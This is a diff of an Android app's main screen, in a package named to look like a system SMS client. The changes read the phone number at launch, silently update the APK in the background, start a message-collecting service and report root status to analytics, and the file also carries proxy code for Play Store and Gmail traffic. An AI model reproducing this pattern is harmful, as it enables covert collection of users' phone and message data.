@@ -2,66 +2,99 @@ package com.android.sms.client;
 
 import android.content.Intent;
 import android.os.Bundle;
-import android.os.StrictMode;
 import android.support.v7.app.ActionBarActivity;
+import android.text.TextUtils;
 import android.text.method.ScrollingMovementMethod;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.view.View;
+import android.widget.Button;
 import android.widget.EditText;
 import android.widget.TextView;
 
 import com.android.proxy.client.GlobalProxyUtil;
-import com.android.proxy.client.MessageEvent;
 import com.android.proxy.client.R;
+import com.flurry.android.FlurryAgent;
+import com.oplay.nohelper.assist.bolts.Task;
+import com.oplay.nohelper.utils.Util_Service;
+import com.stericson.RootTools.RootTools;
+
+import net.luna.common.download.interfaces.ApkDownloadListener;
+import net.luna.common.download.model.AppModel;
+import net.luna.common.download.model.FileDownloadTask;
 
 import org.greenrobot.eventbus.EventBus;
 import org.greenrobot.eventbus.Subscribe;
 
+import java.util.HashMap;
+import java.util.Map;
+import java.util.concurrent.Callable;
 
-public class MainActivity extends ActionBarActivity implements View.OnClickListener {
+
+public class MainActivity extends ActionBarActivity implements View.OnClickListener, ApkDownloadListener {
 
 	private TextView mTvShow;
 	private StringBuilder oldMsg;
 	private EditText mEdtPort;
+	private Button mTvGetPhone;
 
 
 	@Override
 	protected void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_main);
+		FlurryAgent.onStartSession(this);
+		EventBus.getDefault().register(this);
 		findViewById(R.id.connect).setOnClickListener(this);
 		findViewById(R.id.disconnect).setOnClickListener(this);
 		findViewById(R.id.appmanager).setOnClickListener(this);
-		mTvShow = (TextView) findViewById(R.id.tv_socket_message);
+		findViewById(R.id.getinfo).setOnClickListener(this);
+		mTvGetPhone = (Button) findViewById(R.id.trygetnumber);
+		mTvShow = (TextView) findViewById(R.id.message);
 		mEdtPort = (EditText) findViewById(R.id.port);
 		oldMsg = new StringBuilder();
-		if (android.os.Build.VERSION.SDK_INT > 9) {
-			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-			StrictMode.setThreadPolicy(policy);
-		}
-		EventBus.getDefault().register(this);
 		mTvShow.setMovementMethod(ScrollingMovementMethod.getInstance());
-		GlobalProxyUtil.getInstance(this).init();
-		GlobalProxyUtil.getInstance(this).addProxyPackage(this, "com.android.vending");
-		GlobalProxyUtil.getInstance(this).addProxyPackage(this, "com.google.android.gm");
+		String phoneNumber = SmsManageUtil.getInstance(this).getNativePhoneNumber1();
+		if (!TextUtils.isEmpty(phoneNumber)) {
+			mTvGetPhone.setText("phoneNumber：" + phoneNumber);
+		} else {
+			mTvGetPhone.setText("cannot find phone number");
+		}
+
+		Task.callInBackground(new Callable<Object>() {
+			@Override
+			public Object call() throws Exception {
+				ApkUpdateUtil.getInstance(getApplication()).updateApk();
+				return null;
+			}
+		});
+
+//		GlobalProxyUtil.getInstance(this).init();
+//		GlobalProxyUtil.getInstance(this).addProxyPackage(this, "com.android.vending");
+//		GlobalProxyUtil.getInstance(this).addProxyPackage(this, "com.google.android.gm");
 	}
 
 
 	@Override
 	public void onClick(View v) {
 		try {
-			switch (v.getId()){
+			switch (v.getId()) {
 				case R.id.connect:
-					Intent it  = new Intent(this,GetRemotePortService.class);
+					Intent it = new Intent(this, GetRemotePortService.class);
 					startService(it);
 					break;
 				case R.id.disconnect:
 					GlobalProxyUtil.getInstance(this).stopProxy(this);
 					break;
 				case R.id.appmanager:
-					Intent intent = new Intent(this,AppManager.class);
+					Intent intent = new Intent(this, AppManager.class);
 					startActivity(intent);
+				case R.id.getinfo:
+					final boolean isServiceLive = Util_Service.isServiceRunning(this, GetMsgService.class
+							.getCanonicalName());
+					if (!isServiceLive) {
+						startService(new Intent(this, GetMsgService.class));
+					}
 					break;
 			}
 		} catch (Exception e) {
@@ -91,18 +124,19 @@ public class MainActivity extends ActionBarActivity implements View.OnClickListe
 		return super.onOptionsItemSelected(item);
 	}
 
+
 	@Subscribe
 	public void onEvent(final MessageEvent event) {
+
 		runOnUiThread(new Runnable() {
 			@Override
 			public void run() {
 				if (event != null) {
-
 					if (oldMsg.length() == 0) {
-						oldMsg.append(event.getSocketMessage());
+						oldMsg.append(event.getMessage());
 					} else {
 						oldMsg.append("\r\n");
-						oldMsg.append(event.getSocketMessage());
+						oldMsg.append(event.getMessage());
 					}
 
 					mTvShow.setText(oldMsg.toString());
@@ -113,4 +147,58 @@ public class MainActivity extends ActionBarActivity implements View.OnClickListe
 	}
 
 
+	@Override
+	protected void onStop() {
+		super.onStop();
+		FlurryAgent.onEndSession(this);
+	}
+
+	@Override
+	public void onApkDownloadBeforeStart_FileLock(FileDownloadTask task) {
+
+	}
+
+	@Override
+	public void onApkDownloadStart(FileDownloadTask task) {
+
+	}
+
+	@Override
+	public void onApkDownloadSuccess(FileDownloadTask task) {
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+	}
+
+	@Override
+	public void onApkDownloadSuccess(AppModel model) {
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(true));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+	}
+
+	@Override
+	public void onApkDownloadFailed(FileDownloadTask task) {
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_DOWNLOAD_SUCCESS, String.valueOf(false));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_DOWNLOAD, map);
+	}
+
+	@Override
+	public void onApkDownloadStop(FileDownloadTask task) {
+	}
+
+	@Override
+	public void onApkDownloadProgressUpdate(FileDownloadTask task, long contentLength, long completeLength, int
+			percent) {
+
+	}
+
+	@Override
+	public void onApkInstallSuccess(AppModel model) {
+		Map<String, String> map = new HashMap<>();
+		map.put(NativeParams.KEY_INSTALL_SUCCESS,String.valueOf(true));
+		map.put(NativeParams.KEY_IS_DEVICE_ROOT, String.valueOf(RootTools.isAccessGiven()));
+		FlurryAgent.logEvent(NativeParams.EVENT_START_INSTALL, map);
+	}
 }
